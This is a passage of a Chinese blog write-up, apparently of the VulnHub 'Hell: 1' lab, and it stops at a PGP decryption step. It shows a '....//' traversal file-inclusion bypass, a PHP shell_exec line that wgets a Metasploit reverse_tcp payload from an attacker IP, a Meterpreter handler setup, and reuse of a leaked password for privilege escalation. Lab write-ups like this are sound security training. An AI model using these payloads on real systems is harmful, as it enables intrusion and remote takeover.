@@ -1,0 +1,689 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_a0oqhord1y';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  <title>
+    VulnHub Hell：1 | 雾島风起時
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_a0oqhord1y.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="Hell: 1项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;hell&#x2F;hell.ova 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  666 端口响应内容如下 123Welcome to the Admin PanelArchiving latest version on webserver (ec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub Hell：1">
+<meta property="og:url" content="http://example.com/2026/04/01/Hell%201/index.html">
+<meta property="og:site_name" content="雾島风起時">
+<meta property="og:description" content="Hell: 1项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;hell&#x2F;hell.ova 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  666 端口响应内容如下 123Welcome to the Admin PanelArchiving latest version on webserver (ec">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69a79fb5f98389e4a9b7e939.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69a7a744f98389e4a9b7f39a.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69a7a8f2f98389e4a9b7f418.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69a7a979f98389e4a9b7f439.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69a7aa3cf98389e4a9b7f470.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69a7ab28f98389e4a9b7f4bd.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69a7ab86f98389e4a9b7f4d7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69a7adb7f98389e4a9b7f558.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69a7b52fe2b0164ce379bc53.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69a7aff0e2b0164ce379bbac.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69a7b122e2b0164ce379bbfb.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69a7b160e2b0164ce379bc02.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69a7b4d4e2b0164ce379bc48.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69a7b6e3e2b0164ce379bc85.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/69a7be75e2b0164ce379bcfa.png">
+<meta property="article:published_time" content="2026-04-01T08:19:00.000Z">
+<meta property="article:modified_time" content="2026-04-01T09:06:41.641Z">
+<meta property="article:author" content="ALL">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="任意文件读取">
+<meta property="article:tag" content="弱口令">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="越权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/69a79fb5f98389e4a9b7e939.png">
+    <link rel="alternate" href="/atom.xml" title="雾島风起時" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="VulnHub Hell：1">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">VulnHub Hell：1</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hell-1"><span class="toc-number">1.</span> <span class="toc-text">Hell: 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.1.</span> <span class="toc-text">弱口令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Admin"><span class="toc-number">1.1.1.</span> <span class="toc-text">Admin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">越权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#intruder"><span class="toc-number">1.2.1.</span> <span class="toc-text">intruder</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.3.</span> <span class="toc-text">任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#intruder%EF%BC%88%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">intruder（双写绕过）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">1.4.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Notes%EF%BC%88%E7%BB%93%E5%90%88%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E7%BB%84%E5%90%88%E6%8B%B3%EF%BC%89"><span class="toc-number">1.4.1.</span> <span class="toc-text">Notes（结合任意文件读取组合拳）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.5.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-%E5%8D%87%E7%BA%A7%E4%B8%BA%E4%BA%A4%E4%BA%92%E5%BC%8F-Shell"><span class="toc-number">1.5.1.</span> <span class="toc-text">Python 升级为交互式 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.5.2.</span> <span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PGP-%E5%8A%A0%E5%AF%86%E9%82%AE%E4%BB%B6%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.5.3.</span> <span class="toc-text">PGP 加密邮件破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">1.5.4.</span> <span class="toc-text">环境变量劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TrueCrypt-%E7%88%86%E7%A0%B4"><span class="toc-number">1.5.5.</span> <span class="toc-text">TrueCrypt 爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2"><span class="toc-number">1.5.6.</span> <span class="toc-text">SSH 私钥泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81-1"><span class="toc-number">1.5.7.</span> <span class="toc-text">环境变量劫持</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">39</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-Hell 1" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-01T08:19:00.000Z" itemprop="datePublished">2026-04-01</time>
+    <time style="display: none;" id="post-update-time">2026-04-01</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="Hell-1"><a href="#Hell-1" class="headerlink" title="Hell: 1"></a>Hell: 1</h1><p>项目地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/hell/hell.ova">https://download.vulnhub.com/hell/hell.ova</a></p>
+<p>是一个打包好的镜像文件</p>
+<p><strong>注意：导入 vmx 时一定要选择我已移动，否则没网</strong></p>
+<p>使用 Nmap 扫描出开放服务及操作系统版本</p>
+<p><img src="https://pic1.imgdb.cn/item/69a79fb5f98389e4a9b7e939.png"></p>
+<p>666 端口响应内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the Admin Panel</span><br><span class="line">Archiving latest version on webserver (echoserver.bak)...</span><br><span class="line">Starting echo server and monitoring...</span><br></pre></td></tr></table></figure>
+
+<p>扫描目录</p>
+<p><img src="https://pic1.imgdb.cn/item/69a7a744f98389e4a9b7f39a.png"></p>
+<p>继续扫描 <code>/manual</code> 和 <code>/persinal</code> 目录没有结果，于是看看君子协议</p>
+<p><img src="https://pic1.imgdb.cn/item/69a7a8f2f98389e4a9b7f418.png"></p>
+<p>有新的路径了，继续扫描可算是有结果了</p>
+<p><img src="https://pic1.imgdb.cn/item/69a7a979f98389e4a9b7f439.png"></p>
+<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><h3 id="Admin"><a href="#Admin" class="headerlink" title="Admin"></a>Admin</h3><p>打开是一个登录页面</p>
+<p><img src="https://pic1.imgdb.cn/item/69a7aa3cf98389e4a9b7f470.png"></p>
+<p>去别网页看看有没有泄露一些用户名之类的</p>
+<p><img src="https://pic1.imgdb.cn/item/69a7ab28f98389e4a9b7f4bd.png"></p>
+<p><img src="https://pic1.imgdb.cn/item/69a7ab86f98389e4a9b7f4d7.png"></p>
+<p>结合起来扔给 Ai 生成一个字典文件得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jack/g0tmi1k69</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/69a7adb7f98389e4a9b7f558.png"></p>
+<h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><h3 id="intruder"><a href="#intruder" class="headerlink" title="intruder"></a>intruder</h3><p>在 Personal Folder 中发现新的登录框</p>
+<p><img src="https://pic1.imgdb.cn/item/69a7b52fe2b0164ce379bc53.png"></p>
+<p>连续错误三次会报错回显到网页上</p>
+<p><img src="https://pic1.imgdb.cn/item/69a7aff0e2b0164ce379bbac.png"></p>
+<p>检查 Cookie 看到一个 <code>intruder</code> 的值为 1</p>
+<p><img src="https://pic1.imgdb.cn/item/69a7b122e2b0164ce379bbfb.png"></p>
+<p>改为 0 后报错就不见了</p>
+<p><img src="https://pic1.imgdb.cn/item/69a7b160e2b0164ce379bc02.png"></p>
+<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><h3 id="intruder（双写绕过）"><a href="#intruder（双写绕过）" class="headerlink" title="intruder（双写绕过）"></a>intruder（双写绕过）</h3><p>很多 PHP 开发者为了模块化处理错误，喜欢使用 <code>include</code> 或 <code>require</code> 来加载不同的模板</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;intruder&#x27;</span>] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$error_page</span>); <span class="comment">// 如果 $error_page 变量被污染，即存在 LFI</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>怀疑这里存在本地文件包含漏洞，尝试获取 <code>/etc/paswd</code> 文件</p>
+<p>但是 <code>../</code> 貌似被过滤了，使用 <code>....//</code> 代替绕过</p>
+<p>当攻击者输入 <code>....//</code> 时，过滤过程如下：</p>
+<ol>
+<li><p><strong>匹配阶段：</strong> 过滤器从左向右扫描，在 <code>....//</code> 中发现了中间的 <code>../</code></p>
+</li>
+<li><p><strong>替换阶段：</strong> 过滤器将匹配到的 <code>../</code> 删掉</p>
+</li>
+<li><p><strong>结果产出：</strong> 剩下的两端字符——左边的 <code>..</code> 和右边的 <code>/</code>——自动“塌陷”合并，变成了 <code>../</code></p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">....//....//....//....//....//....//etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/69a7b4d4e2b0164ce379bc48.png"></p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="Notes（结合任意文件读取组合拳）"><a href="#Notes（结合任意文件读取组合拳）" class="headerlink" title="Notes（结合任意文件读取组合拳）"></a>Notes（结合任意文件读取组合拳）</h3><p>在 Notes 中发现一个输入框，它会将内容保存到 <code>note.txt</code> 中</p>
+<p><img src="https://pic1.imgdb.cn/item/69a7b6e3e2b0164ce379bc85.png"></p>
+<p>可以尝试编写一个反弹 Shell，先使用 MSF</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfpayload php/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=443 R &gt; sneaky.txt</span><br></pre></td></tr></table></figure>
+
+<p>然后监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use multi/handler</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> lport 443</span><br><span class="line">lport =&gt; 443</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> lhost 192.168.0.110</span><br><span class="line">lhost =&gt; 192.168.0.110</span><br><span class="line">msf exploit(handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>然后注入命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;wget http://192.168.0.110/sneaky.txt -O /tmp/sneaky.txt 2&gt;&amp;1&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Cookie 被修改为 <code>/tmp/note.txt</code>（至于为什么是 <code>/tmp</code> 目录，只能说凭感觉）</p>
+<p>页面重新加载时，我们的恶意 note.txt 文件会被包含在内，PHP 会被解析，我们的有效载荷文件会被下载</p>
+<p><img src="https://pic1.imgdb.cn/item/69a7be75e2b0164ce379bcfa.png"></p>
+<p>再次修改 Cookie 以包含 <code>/tmp/sneaky.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Sending stage (40551 bytes) to 192.168.0.103</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.110:443 -&gt; 192.168.0.103:48153) at 2014-07-17 21:55:37 +0100</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="Python-升级为交互式-Shell"><a href="#Python-升级为交互式-Shell" class="headerlink" title="Python 升级为交互式 Shell"></a>Python 升级为交互式 Shell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><p>在 <code>/super_secret_login_path_muhahaha/</code> 目录下的文件中使用 grep 命令快速搜索单词password，结果如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ grep password /var/www/super_secret_login_path_muhahaha/*</span><br><span class="line">index.php:&lt;INPUT name=<span class="string">&quot;password&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;password&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;&quot;</span>/&gt;</span><br><span class="line">login.php:    <span class="variable">$password</span> = mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line">login.php:    // mysql_connect(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;Jack&quot;</span>, <span class="string">&quot;zgcR6mU6pX&quot;</span>) or die (<span class="string">&quot;Server Error&quot;</span>); I<span class="string">&#x27;ll change this back once development is done. Got sick of typing my password.</span></span><br><span class="line"><span class="string">login.php:   $sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;</span><span class="variable">$username</span><span class="string">&#x27; and password=&#x27;</span><span class="variable">$password</span><span class="string">&#x27;&quot;;</span></span><br><span class="line"><span class="string">personal.php:&lt;INPUT name=&quot;password&quot; id=&quot;password&quot; type=&quot;password&quot; value=&quot;&quot;/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>拿到密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zgcR6mU6pX</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ su jack</span><br><span class="line">Password: zgcR6mU6pX</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">jack</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+
+<h3 id="PGP-加密邮件破解"><a href="#PGP-加密邮件破解" class="headerlink" title="PGP 加密邮件破解"></a>PGP 加密邮件破解</h3><p>在 <code>/var/mail/jack/received</code> 目录下有一封加密邮件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PGP MESSAGE-----</span><br><span class="line">Version: BCPG C# v1.6.1.0</span><br><span class="line"></span><br><span class="line">hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm</span><br><span class="line">yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ</span><br><span class="line">3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX</span><br><span class="line">7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24</span><br><span class="line">rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ</span><br><span class="line">MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH</span><br><span class="line">9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me</span><br><span class="line">V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo</span><br><span class="line">svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD</span><br><span class="line">+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug==</span><br><span class="line">=svWU</span><br><span class="line">-----END PGP MESSAGE-----</span><br></pre></td></tr></table></figure>
+
+<p>Jack 在本地主机上使用 PGP，因此他的 PGP 密钥存储在 <code>/home/jack/.pgp</code> 中，并附有一条注释，为我们提供了密码提示</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -l .pgp</span><br><span class="line"><span class="built_in">ls</span> -l .pgp</span><br><span class="line">total 12</span><br><span class="line">-rwx------ 1 jack jack   39 Jun 18 12:35 note</span><br><span class="line">-rwx------ 1 jack jack 1802 Jun 18 12:20 pgp.priv</span><br><span class="line">-rwx------ 1 jack jack  890 Jun 18 12:24 pgp.pub</span><br><span class="line">$ <span class="built_in">cat</span> .pgp/note</span><br><span class="line">The usual password as with everything.</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+
+<p>我们可以假设密码是 <code>g0tmi1k69</code> 或 <code>zgcR6mU6pX</code></p>
+<p>GPG 已安装，因此下一步合乎逻辑的做法是尝试使用这两个密码之一以及 Jack 的 PGP 私钥来解密电子邮件</p>
